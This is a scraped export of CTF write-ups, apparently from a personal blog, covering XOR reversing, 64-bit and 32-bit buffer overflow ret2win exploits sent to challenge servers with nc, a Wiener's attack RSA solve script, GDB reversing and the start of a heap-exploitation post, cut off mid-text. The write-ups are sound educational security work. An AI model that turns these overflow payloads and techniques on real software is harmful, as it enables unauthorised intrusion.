xxd reflection | grep -A 4 3060: 00003060: 1626 3820 7965 6867 6178 0f65 1f9b 542f .\u00268 yehgax.e..T/ 00003070: 4f52 3477 7f72 5b26 352e bb76 b16d 665c OR4w.r[\u00265..v.mf\\ 00003080: 6a79 6e7d 7047 626e 795e 6b71 0372 2f76 jyn}pGbny^kq.r/v 00003090: 7f68 6b64 7562 ee5d e96d 4f62 6b44 451f .hkdub.].mObkDE. 000030a0: 2547 4343 3a20 2844 6562 6961 6e20 3130 %GCC: (Debian 10  And we can extract the first 65 bytes (130 hexadecimal digits) as follows:\n$ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 \u00268 yehgaxeT/OR4wr[\u00265.vmf\\jyn}pGbny^kqr/vhkdub]mObkDE%GCC: (Debian 10 $ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 | xxd -p 162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d 665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f62 6b44451f254743433a202844656269616e203130 $ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 | xxd -p | tr -d \\\\n 162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f626b44451f254743433a202844656269616e203130 $ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 | xxd -p | tr -d \\\\n | cut -b-130 162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f626b44451f25  And we can perform similar operations to get the first 65 bytes of the ELF header without null bytes:\n$ xxd reflection | head -30 | xxd -r | tr -d \\\\0 | xxd -p 7f454c46020101033e01601040f03a40380d401f1e0604404040d802d802 0803041803180318031c1c010104700670061001051010109d029d021001 0420202058015801100106e82de83de83db902d802100206f82df83df83d e001e00108040438033803 $ xxd reflection | head -30 | xxd -r | tr -d \\\\0 | xxd -p | tr -d \\\\n 7f454c46020101033e01601040f03a40380d401f1e0604404040d802d8020803041803180318031c1c010104700670061001051010109d029d0210010420202058015801100106e82de83de83db902d802100206f82df83df83de001e00108040438033803 $ xxd reflection | head -30 | xxd -r | tr -d \\\\0 | xxd -p | tr -d \\\\n | cut -b-130 7f454c46020101033e01601040f03a40380d401f1e0604404040d802d8020803041803180318031c1c010104700670061001051010109d029d0210010420202058  Finally, we can apply XOR cipher to both payloads and extract the flag:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; a = bytes.fromhex('7f454c46020101033e01601040f03a40380d401f1e0604404040d802d8020803041803180318031c1c010104700670061001051010109d029d0210010420202058') \u0026gt;\u0026gt;\u0026gt; b = bytes.fromhex('162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f626b44451f25') \u0026gt;\u0026gt;\u0026gt; xor(a, b) b'ictf{did_you_know_that_function_names_are_just_pointers_to_code?}' \u0026gt;\u0026gt;\u0026gt; exit() $ ./reflection  ictf{did_you_know_that_function_names_are_just_pointers_to_code?} yes  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/reflection/","section":"ctf","summary":"ImaginaryCTF 12/07/2022. 75 points. XOR cipher","time":3,"title":"Reflection"},{"contents":"We are given a 64-bit binary called reg:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is main:\nintmain() { run(); return0; }  Let\u0026rsquo;s see run:\nvoidrun() { charlocal_38[48]; initialize(); printf(\"Enter your name : \"); gets(local_38); puts(\"Registered!\"); return; }  The binary is vulnerable to Buffer Overflow since there is a variable called local_38 that has 48 bytes assigned as buffer, but the program is using gets, which is an insecure function because it does not limit the length of the input data, thus overflowing the reserved buffer if the size of the input data is greater than 48 bytes.\nWe can check that it crashes in this situation:\n$ ./reg Enter your name : asdf Registered! $ python3 -c 'print(\"A\" * 100)' | ./reg Enter your name : Registered! zsh: done python3 -c 'print(\"A\" * 100)' | zsh: segmentation fault (core dumped) ./reg  The program crashes because we overwrote the saved return address and when the program tries to return, it finds out an invalid memory address.\nDue to the fact that it is a 64-bit binary without canary protection, the offset needed to overflow the buffer and reach the stack is 56 (because after the reserved 48 bytes, the saved value of $rbp is saved, and right after, the saved return instruction).\nAnyway, we can use a pattern string in GDB to find out the offset:\n$ gdb -q reg Reading symbols from reg... (No debugging symbols found in reg) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [+] Saved as '$_gef0' gef➤ run Starting program: /home/rocky/Desktop/HTB/Challenges/Pwn/Reg/reg Enter your name : aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa Registered! Program received signal SIGSEGV, Segmentation fault. 0x00000000004012ac in run ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 56 (little-endian search) likely [+] Found at offset 49 (big-endian search)  Looking again at the decompiled source code, there is a function called winner:\nvoidwinner() { charlocal_418[1032]; FILE *local_10;  puts(\"Congratulations!\"); local_10 =fopen(\"flag.txt\", \"r\"); fgets(local_418, 0x400, local_10); puts(local_418); fclose(local_10); return; }  This function opens flag.txt and prints out the content.\nThe address of this function is fix because the binary has no PIE protection, we can see it using GDB, readelf or objdump:\ngef➤ p winner $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x401206 \u0026lt;winner\u0026gt; gef➤ quit $ readelf -s reg | grep winner 75: 0000000000401206 100 FUNC GLOBAL DEFAULT 13 winner $ objdump -d reg | grep winner 0000000000401206 \u0026lt;winner\u0026gt;:  So, the idea is to exploit the Buffer Overflow vulnerability and modify the saved return instruction so that we can call winner and read the flag. Let\u0026rsquo;s do it locally:\n$ echo 'HTB{f4k3_fl4g_f0r_t3st1ng}' \u0026gt; flag.txt $ python3 -c 'from pwn import os, p64; os.write(1, b\"A\" * 56 + p64(0x401206) + b\"\\n\")' | ./reg Enter your name : Registered! Congratulations! HTB{f4k3_fl4g_f0r_t3st1ng} zsh: done python3 -c | zsh: segmentation fault (core dumped) ./reg  Notice that we need to add a newline character at the end because gets expects that character to stop reading.\nAlright, it\u0026rsquo;s time to try remotely:\n$ python3 -c 'from pwn import os, p64; os.write(1, b\"A\" * 56 + p64(0x401206) + b\"\\n\")' | nc 178.62.39.153 30785 Enter your name : Registered! Congratulations! HTB{N3W_70_pWn}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/reg/","section":"ctf","summary":"64-bit binary. Buffer Overflow. Redirecting program execution","time":3,"title":"Reg"},{"contents":"We are given the Python source code used to encrypt the flag:\n#!/usr/bin/env python3 fromCrypto.Util.numberimport* p=getPrime(512) q=getPrime(512) n=p * q phi=(p - 1) * (q - 1) d=getPrime(32) e=pow(d, -1, phi) m=bytes_to_long(open('flag.txt', 'rb').read()) c=pow(m, e, n) print(f'{n= }') print(f'{e= }') print(f'{c= }') ''' n = 134872711253918655399533296784203466697159038260837702891888089821702090938512308686613559851138816682269099219724900870388583883202954112422023894133671598222066489215524613014212242490437041258588247678792591072443719118562580052842727775772283919113007499992167089258075609504428713653013187230671841726369 e = 50920242742169837294267124730818234703309561711363177522992049271988492365017092545331352650316729342598781520444569769450329777448285534584484096179230968844630486688656705514759778561817709539781927624692111848722199024819005269510690240743887870339853351421726436719236180272680237157536332997570569192069 c = 133155317855020316110137499609990113815646625767974277474197900721563685454745247616867035013963212538345727281661922602291072931578581035070345294335733120033652413487827994383327148598029065495228796201084369245315585407592741900307825557286213370482646401885352854920924352919398804532780740979273692054391 '''  The encryption type is RSA, but the implementation is wrong. The issue is that the private number $d$ is relatively small (a 32-bit prime number). Hence, we can break the encryption with Wiener\u0026rsquo;s attack.\nWe can implement this attack in Python with a library called owiener (the installation can be done with pip). Once we have $d$, we can decrypt the ciphertext as $m = c^d \\pmod{n}$.\nThis is the solution script in Python:\n#!/usr/bin/env python3 importowiener defmain(): n=134872711253918655399533296784203466697159038260837702891888089821702090938512308686613559851138816682269099219724900870388583883202954112422023894133671598222066489215524613014212242490437041258588247678792591072443719118562580052842727775772283919113007499992167089258075609504428713653013187230671841726369 e=50920242742169837294267124730818234703309561711363177522992049271988492365017092545331352650316729342598781520444569769450329777448285534584484096179230968844630486688656705514759778561817709539781927624692111848722199024819005269510690240743887870339853351421726436719236180272680237157536332997570569192069 c=133155317855020316110137499609990113815646625767974277474197900721563685454745247616867035013963212538345727281661922602291072931578581035070345294335733120033652413487827994383327148598029065495228796201084369245315585407592741900307825557286213370482646401885352854920924352919398804532780740979273692054391 d=owiener.attack(e, n) m=pow(c, d, n) print(bytes.fromhex(hex(m)[2:]).decode()) if__name__=='__main__': main()  And we obtain the flag:\n$ python3 solve.py ictf{have_fun_at_ICTF_22!!!_559543c1}  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/relatively-small-arguments/","section":"ctf","summary":"ImaginaryCTF 14/07/2022. 75 points. RSA. Wiener's attack","time":1,"title":"Relatively Small Arguments"},{"contents":"We are given this stream of bits from a hard drive:\n10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101  We need to represent it in readable characters. First, we can use Python to express the binary stream as a hexadecimal number:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0b10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101) '0x4354466c6561726e7b4269745f466c697070696e7d'  Notice that we must add 0b to tell Python that the number is in binary format.\nFrom the hexadecimal digits, we can foresee that these are ASCII characters (i.e. 0x43 is C, 0x54 is T and 0x46 is F).\nTo decode these bytes from hexadecimal numbers, we can use binascii.unhexlify (without the 0x preffix):\n\u0026gt;\u0026gt;\u0026gt; bytes.fromhex('4354466c6561726e7b4269745f466c697070696e7d') b'CTFlearn{Bit_Flippin}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/reverse-polarity/","section":"ctf","summary":"Decoding ASCII binary","time":1,"title":"Reverse Polarity"},{"contents":"We have a 64-bit binary called Reykjavik:\n$ file Reykjavik Reykjavik: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bc04368dbcefb4491573ac8feea3a32e31ed59f, for GNU/Linux 3.2.0, not stripped  If we execute it, we see that it needs a command line argument:\n$ ./Reykjavik Usage: Reykjavik CTFlearn{flag} $ ./Reykjavik 'CTFlearn{flag}' Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{flag} Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse Sorry Dude, 'CTFlearn{flag}' is not the flag :-(  Let\u0026rsquo;s run GDB to debug the program. First, we can disassemble the main function:\n$ gdb -q Reykjavik Reading symbols from Reykjavik... (No debugging symbols found in Reykjavik) gef➤ disassemble main Dump of assembler code for function main: 0x00000000000010a0 \u0026lt;+0\u0026gt;: endbr64 0x00000000000010a4 \u0026lt;+4\u0026gt;: push r13 0x00000000000010a6 \u0026lt;+6\u0026gt;: push r12 0x00000000000010a8 \u0026lt;+8\u0026gt;: push rbp 0x00000000000010a9 \u0026lt;+9\u0026gt;: sub rsp,0x20 0x00000000000010ad \u0026lt;+13\u0026gt;: cmp edi,0x1 0x00000000000010b0 \u0026lt;+16\u0026gt;: je 0x11b5 \u0026lt;main+277\u0026gt; 0x00000000000010b6 \u0026lt;+22\u0026gt;: mov rbp,QWORD PTR [rsi+0x8] 0x00000000000010ba \u0026lt;+26\u0026gt;: mov edi,0x1 0x00000000000010bf \u0026lt;+31\u0026gt;: xor eax,eax 0x00000000000010c1 \u0026lt;+33\u0026gt;: lea rsi,[rip+0xf60] # 0x2028 0x00000000000010c8 \u0026lt;+40\u0026gt;: mov rdx,rbp 0x00000000000010cb \u0026lt;+43\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x00000000000010d0 \u0026lt;+48\u0026gt;: lea rdi,[rip+0xf91] # 0x2068 0x00000000000010d7 \u0026lt;+55\u0026gt;: call 0x1070 \u0026lt;puts@plt\u0026gt; 0x00000000000010dc \u0026lt;+60\u0026gt;: lea rdx,[rip+0xfcd] # 0x20b0 0x00000000000010e3 \u0026lt;+67\u0026gt;: mov ecx,0x20 0x00000000000010e8 \u0026lt;+72\u0026gt;: mov rsi,rbp 0x00000000000010eb \u0026lt;+75\u0026gt;: mov rdi,rdx 0x00000000000010ee \u0026lt;+78\u0026gt;: repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 0x00000000000010f0 \u0026lt;+80\u0026gt;: seta al 0x00000000000010f3 \u0026lt;+83\u0026gt;: sbb al,0x0 0x00000000000010f5 \u0026lt;+85\u0026gt;: test al,al 0x00000000000010f7 \u0026lt;+87\u0026gt;: je 0x11c9 \u0026lt;main+297\u0026gt; 0x00000000000010fd \u0026lt;+93\u0026gt;: mov rdx,QWORD PTR [rip+0x2f0c] # 0x4010 \u0026lt;data\u0026gt; 0x0000000000001104 \u0026lt;+100\u0026gt;: mov r13,rsp 0x0000000000001107 \u0026lt;+103\u0026gt;: mov rsi,rbp 0x000000000000110a \u0026lt;+106\u0026gt;: mov BYTE PTR [rsp+0x1b],0x0 0x000000000000110f \u0026lt;+111\u0026gt;: movabs rax,0xabababababababab 0x0000000000001119 \u0026lt;+121\u0026gt;: mov rdi,r13 0x000000000000111c \u0026lt;+124\u0026gt;: xor rdx,rax 0x000000000000111f \u0026lt;+127\u0026gt;: mov QWORD PTR [rsp],rdx 0x0000000000001123 \u0026lt;+131\u0026gt;: mov rdx,QWORD PTR [rip+0x2eee] # 0x4018 \u0026lt;data+8\u0026gt; 0x000000000000112a \u0026lt;+138\u0026gt;: xor rdx,rax 0x000000000000112d \u0026lt;+141\u0026gt;: xor rax,QWORD PTR [rip+0x2eec] # 0x4020 \u0026lt;data+16\u0026gt; 0x0000000000001134 \u0026lt;+148\u0026gt;: mov QWORD PTR [rsp+0x10],rax 0x0000000000001139 \u0026lt;+153\u0026gt;: movzx eax,BYTE PTR [rip+0x2ee8] # 0x4028 \u0026lt;data+24\u0026gt; 0x0000000000001140 \u0026lt;+160\u0026gt;: mov QWORD PTR [rsp+0x8],rdx 0x0000000000001145 \u0026lt;+165\u0026gt;: xor eax,0xffffffab 0x0000000000001148 \u0026lt;+168\u0026gt;: mov BYTE PTR [rsp+0x18],al 0x000000000000114c \u0026lt;+172\u0026gt;: movzx eax,BYTE PTR [rip+0x2ed6] # 0x4029 \u0026lt;data+25\u0026gt; 0x0000000000001153 \u0026lt;+179\u0026gt;: xor eax,0xffffffab 0x0000000000001156 \u0026lt;+182\u0026gt;: mov BYTE PTR [rsp+0x19],al 0x000000000000115a \u0026lt;+186\u0026gt;: movzx eax,BYTE PTR [rip+0x2ec9] # 0x402a \u0026lt;data+26\u0026gt; 0x0000000000001161 \u0026lt;+193\u0026gt;: xor eax,0xffffffab 0x0000000000001164 \u0026lt;+196\u0026gt;: mov BYTE PTR [rsp+0x1a],al 0x0000000000001168 \u0026lt;+200\u0026gt;: call 0x1080 \u0026lt;strcmp@plt\u0026gt; 0x000000000000116d \u0026lt;+205\u0026gt;: mov r12d,eax 0x0000000000001170 \u0026lt;+208\u0026gt;: test eax,eax 0x0000000000001172 \u0026lt;+210\u0026gt;: jne 0x1197 \u0026lt;main+247\u0026gt; 0x0000000000001174 \u0026lt;+212\u0026gt;: mov rdx,r13 0x0000000000001177 \u0026lt;+215\u0026gt;: lea rsi,[rip+0xf7a] # 0x20f8 0x000000000000117e \u0026lt;+222\u0026gt;: mov edi,0x1 0x0000000000001183 \u0026lt;+227\u0026gt;: xor eax,eax 0x0000000000001185 \u0026lt;+229\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x000000000000118a \u0026lt;+234\u0026gt;: add rsp,0x20 0x000000000000118e \u0026lt;+238\u0026gt;: mov eax,r12d 0x0000000000001191 \u0026lt;+241\u0026gt;: pop rbp 0x0000000000001192 \u0026lt;+242\u0026gt;: pop r12 0x0000000000001194 \u0026lt;+244\u0026gt;: pop r13 0x0000000000001196 \u0026lt;+246\u0026gt;: ret 0x0000000000001197 \u0026lt;+247\u0026gt;: mov rdx,rbp 0x000000000000119a \u0026lt;+250\u0026gt;: mov edi,0x1 0x000000000000119f \u0026lt;+255\u0026gt;: xor eax,eax 0x00000000000011a1 \u0026lt;+257\u0026gt;: mov r12d,0x4 0x00000000000011a7 \u0026lt;+263\u0026gt;: lea rsi,[rip+0xf7a] # 0x2128 0x00000000000011ae \u0026lt;+270\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x00000000000011b3 \u0026lt;+275\u0026gt;: jmp 0x118a \u0026lt;main+234\u0026gt; 0x00000000000011b5 \u0026lt;+277\u0026gt;: lea rdi,[rip+0xe4c] # 0x2008 0x00000000000011bc \u0026lt;+284\u0026gt;: mov r12d,0x1 0x00000000000011c2 \u0026lt;+290\u0026gt;: call 0x1070 \u0026lt;puts@plt\u0026gt; 0x00000000000011c7 \u0026lt;+295\u0026gt;: jmp 0x118a \u0026lt;main+234\u0026gt; 0x00000000000011c9 \u0026lt;+297\u0026gt;: lea rsi,[rip+0xf00] # 0x20d0 0x00000000000011d0 \u0026lt;+304\u0026gt;: mov edi,0x1 0x00000000000011d5 \u0026lt;+309\u0026gt;: mov r12d,0x2 0x00000000000011db \u0026lt;+315\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x00000000000011e0 \u0026lt;+320\u0026gt;: jmp 0x118a \u0026lt;main+234\u0026gt; End of assembler dump.  We see that there is a call to strcmp at main+200. We can set a breakpoint right there and run the program:\ngef➤ break *main+200 Breakpoint 1 at 0x1168 gef➤ run 'CTFlearn{flag}' Starting program: ./Reykjavik 'CTFlearn{flag}' Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{flag} Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse Breakpoint 1, 0x0000555555555168 in main ()  Now that we are stop at that instruction, we can see the first argument of strcmp (which is at $rdi in x64). And we have the flag:\ngef➤ x/s $rdi 0x7fffffffe650: \"CTFlearn{Eye_L0ve_Iceland_}\"  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/reverse-engineering/reykjavik/","section":"ctf","summary":"Debugging with GDB. XOR decryption","time":3,"title":"Reykjavik"},{"contents":"We are given a 32-bit binary called server:\nArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)  We also have the C source code. Basically, what the program does is call function gets, which is vulnerable to Buffer Overflow:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void win() { system(\"/bin/cat /flag.txt\"); } void vuln() { char padding[16]; char buff[32]; memset(buff, 0, sizeof(buff)); // Zero-out the buffer. memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff. // Initializes the stack visualization. Don't worry about it! init_visualize(buff); // Prints out the stack before modification visualize(buff); printf(\"Input some text: \"); gets(buff); // This is a vulnerable call! // Prints out the stack after modification visualize(buff); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); vuln(); }  The aim of the challenge is to redirect the program execution to call function win by exploiting the Buffer Overflow vulnerability. In fact, the program is built to show the stack before and after calling gets:\n$ ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffe40090 | 00 00 00 00 00 00 00 00 | 0xffe40098 | 00 00 00 00 00 00 00 00 | 0xffe400a0 | 00 00 00 00 00 00 00 00 | 0xffe400a8 | 00 00 00 00 00 00 00 00 | 0xffe400b0 | ff ff ff ff ff ff ff ff | 0xffe400b8 | ff ff ff ff ff ff ff ff | 0xffe400c0 | 80 25 ee f7 00 a0 04 08 | 0xffe400c8 | d8 00 e4 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: AAAA Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffe40090 | 41 41 41 41 00 00 00 00 | 0xffe40098 | 00 00 00 00 00 00 00 00 | 0xffe400a0 | 00 00 00 00 00 00 00 00 | 0xffe400a8 | 00 00 00 00 00 00 00 00 | 0xffe400b0 | ff ff ff ff ff ff ff ff | 0xffe400b8 | ff ff ff ff ff ff ff ff | 0xffe400c0 | 80 25 ee f7 00 a0 04 08 | 0xffe400c8 | d8 00 e4 ff 8b 86 04 08 | Return address: 0x0804868b  We need to overwrite the bytes shown in red ($eip register). To reach this point, we need a total of 60 bytes. We can test it using BBBB:\n$ python3 -c 'print(\"A\" * 60 + \"BBBB\")' | ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xfff8b4a0 | 00 00 00 00 00 00 00 00 | 0xfff8b4a8 | 00 00 00 00 00 00 00 00 | 0xfff8b4b0 | 00 00 00 00 00 00 00 00 | 0xfff8b4b8 | 00 00 00 00 00 00 00 00 | 0xfff8b4c0 | ff ff ff ff ff ff ff ff | 0xfff8b4c8 | ff ff ff ff ff ff ff ff | 0xfff8b4d0 | 80 85 f0 f7 00 a0 04 08 | 0xfff8b4d8 | e8 b4 f8 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xfff8b4a0 | 41 41 41 41 41 41 41 41 | 0xfff8b4a8 | 41 41 41 41 41 41 41 41 | 0xfff8b4b0 | 41 41 41 41 41 41 41 41 | 0xfff8b4b8 | 41 41 41 41 41 41 41 41 | 0xfff8b4c0 | 41 41 41 41 41 41 41 41 | 0xfff8b4c8 | 41 41 41 41 41 41 41 41 | 0xfff8b4d0 | 41 41 41 41 41 41 41 41 | 0xfff8b4d8 | 41 41 41 41 42 42 42 42 | Return address: 0x42424242 zsh: done python3 -c 'print(\"A\" * 60 + \"BBBB\")' | zsh: segmentation fault (core dumped) ./server  The program crashes (segmentation fault) because the address 0x42424242 (BBBB) is invalid.\nNow that we have full control of the next instruction to execute ($eip register), we can put the address of win. This address can be obtained using readelf:\n$ readelf -s server | grep win 64: 08048586 43 FUNC GLOBAL DEFAULT 14 win  This hexadecimal number must be entered in little-endian format (bytes in reverse order). If we want to test it locally, we must create a file /flag.txt:\n# echo THISISTHEFLAG | tee /flag.txt THISISTHEFLAG  Now we can enter our payload:\n$ echo -e \"$(python3 -c 'print(\"A\" * 60)')\\x86\\x85\\x04\\x08\" | ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffc2ea30 | 00 00 00 00 00 00 00 00 | 0xffc2ea38 | 00 00 00 00 00 00 00 00 | 0xffc2ea40 | 00 00 00 00 00 00 00 00 | 0xffc2ea48 | 00 00 00 00 00 00 00 00 | 0xffc2ea50 | ff ff ff ff ff ff ff ff | 0xffc2ea58 | ff ff ff ff ff ff ff ff | 0xffc2ea60 | 80 d5 f7 f7 00 a0 04 08 | 0xffc2ea68 | 78 ea c2 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffc2ea30 | 41 41 41 41 41 41 41 41 | 0xffc2ea38 | 41 41 41 41 41 41 41 41 | 0xffc2ea40 | 41 41 41 41 41 41 41 41 | 0xffc2ea48 | 41 41 41 41 41 41 41 41 | 0xffc2ea50 | 41 41 41 41 41 41 41 41 | 0xffc2ea58 | 41 41 41 41 41 41 41 41 | 0xffc2ea60 | 41 41 41 41 41 41 41 41 | 0xffc2ea68 | 41 41 41 41 86 85 04 08 | Return address: 0x08048586 THISISTHEFLAG zsh: done echo -e \"$(python3 -c 'print(chr(0x41) * 60)')\\x86\\x85\\x04\\x08\" | zsh: segmentation fault (core dumped) ./server  Perfect, we have successfully called win. Now let\u0026rsquo;s do it on server side:\n$ echo -e \"$(python3 -c 'print(\"A\" * 60)')\\x86\\x85\\x04\\x08\" | nc thekidofarcrania.com 4902 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xff856760 | 00 00 00 00 00 00 00 00 | 0xff856768 | 00 00 00 00 00 00 00 00 | 0xff856770 | 00 00 00 00 00 00 00 00 | 0xff856778 | 00 00 00 00 00 00 00 00 | 0xff856780 | ff ff ff ff ff ff ff ff | 0xff856788 | ff ff ff ff ff ff ff ff | 0xff856790 | c0 a5 f0 f7 00 a0 04 08 | 0xff856798 | a8 67 85 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xff856760 | 41 41 41 41 41 41 41 41 | 0xff856768 | 41 41 41 41 41 41 41 41 | 0xff856770 | 41 41 41 41 41 41 41 41 | 0xff856778 | 41 41 41 41 41 41 41 41 | 0xff856780 | 41 41 41 41 41 41 41 41 | 0xff856788 | 41 41 41 41 41 41 41 41 | 0xff856790 | 41 41 41 41 41 41 41 41 | 0xff856798 | 41 41 41 41 86 85 04 08 | Return address: 0x08048586 CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa} timeout: the monitored command dumped core  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/binary/rip-my-bof/","section":"ctf","summary":"32-bit binary. Buffer Overflow. Redirecting program execution","time":6,"title":"RIP my bof"},{"contents":"We are given a 64-bit binary called main:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  We are given a Dockerfile that starts with FROM ubuntu:18.04, so we take Glibc from the container and use pwninit to patch the binary:\n$ docker run --rm -v \"$(pwd)\":/home/rocky -it ubuntu:18.04 bash root@c591782492e6:/# ldd /bin/sh linux-vdso.so.1 (0x00007ffde1fb3000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbcde5ef000) /lib64/ld-linux-x86-64.so.2 (0x00007fbcdec00000) root@c591782492e6:/# /lib64/ld-linux-x86-64.so.2 /lib/x86_64-linux-gnu/libc.so.6 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 7.5.0. libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: \u0026lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u0026gt;. root@c591782492e6:/# cp /lib64/ld-linux-x86-64.so.2 /lib/x86_64-linux-gnu/libc.so.6 /home/rocky root@c591782492e6:/# exit exit $ pwninit --libc libc.so.6 --ld ld-linux-x86-64.so.2 --bin main --no-template bin: main libc: libc.so.6 ld: ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.6_amd64.deb copying mainto main_patched running patchelf on main_patched  If we open the binary in Ghidra we see these functions with a typical heap exploitation menu:\nvoidrobots_factory() { intoption; puts(\"Welcome to the secret robots factory!\"); while(true) { menu(); option =read_int(); if(option ==4) break; if(option \u0026lt;5) { if(option ==3) { destroy_robot(); } elseif(option \u0026lt;4) { if(option ==1) { new_robot(); } elseif(option ==2) { program_robot(); } } } } } intmain() { setvbuf(stderr,NULL,2,0); setvbuf(stdout,NULL,2,0); setvbuf(stdin,NULL,2,0); robots_factory(); return0; }  We have the ability to create robots:\nvoidnew_robot() { intsize; void*p_robot; longin_FS_OFFSET; inti; charsize_str[5]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); if(number_robots \u0026lt;5) { puts(\"Provide robot memory size:\"); read(0, size_str, 4); size =atoi(size_str); if(size \u0026lt;0x101) { puts(\"you\\'re creating a stupid robot.\"); } else{ for(i =0; i \u0026lt;5; i++) { if(check_robot_slot[i] ==0) { p_robot =calloc(1, (long) size); robots[i] =p_robot; check_robot_slot[i] =1; robot_memory_size[i] =size; printf(\"You got new page at index %d\\n\", (ulong) (uint) i); number_robots =number_robots +1; break; } } } } else{ puts(\"All slots are occupied :(\"); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  We are asked to enter a size bigger than 0x101 (257). When creating the robot, the program uses calloc. This is important for exploitation since calloc does not use the Tcache.\nThere are some global arrays and variables that store metadata of the robots (robots, robots_memory_size, check_robot_slot and number_robots). Moreover, we can only allocate up to 5 robots.\nThis is the function to program a robot:\nvoidprogram_robot() { intindex; longin_FS_OFFSET; charindex_str[5]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); puts(\"Provide robot\\'s slot:\"); read(0, index_str, 4); index =atoi(index_str); if((index \u0026lt;0) ||(4\u0026lt;index)) { puts(\"Slot is empty!\"); } elseif(robots[index] !=NULL) { puts(\"Program the robot:\"); read(0, robots[index], (long) robot_memory_size[index]); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  The first thing we notice is that we can edit any robot as long 